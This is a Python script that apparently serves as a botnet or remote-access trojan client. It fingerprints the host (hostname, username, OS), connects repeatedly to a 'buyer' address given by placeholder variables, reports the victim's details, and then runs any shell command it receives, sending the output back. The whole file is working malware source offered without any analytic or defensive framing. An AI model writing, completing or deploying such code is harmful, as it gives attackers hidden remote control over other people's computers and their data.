import socket
import json
import platform
import os
import subprocess
import time
import random

def get_system_info():
    return {
        "os": platform.system(),
        "hostname": platform.node(), 
        "username": os.getenv("USERNAME", "unknown"),
        "architecture": platform.architecture()[0]
    }

def execute_command(command):
    try:
        if command.startswith("cmd:"):
            result = subprocess.run(command[4:], shell=True, capture_output=True, text=True, timeout=30)
            output = result.stdout + result.stderr
        elif command == "sysinfo":
            output = json.dumps(get_system_info(), indent=2)
        else:
            output = f"Unknown command: {command}"
    except Exception as e:
        output = f"Error: {str(e)}"
    return output

def connect_to_buyer():
    bot_id = f"{platform.node()}-{os.getenv('USERNAME', 'user')}-{random.randint(1000,9999)}"
    
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(30)
            sock.connect((BUYER_IP, BUYER_PORT))
            
            connect_msg = {
                "bot_id": bot_id,
                "system_info": get_system_info()
            }
            
            sock.send(json.dumps(connect_msg).encode())
            print(f"Connected to buyer at {BUYER_IP}:{BUYER_PORT}")
            
            while True:
                command = sock.recv(1024).decode()
                if not command:
                    break
                output = execute_command(command)
                sock.send(output.encode())
                
        except Exception as e:
            time.sleep(30)

if __name__ == "__main__":
    connect_to_buyer()
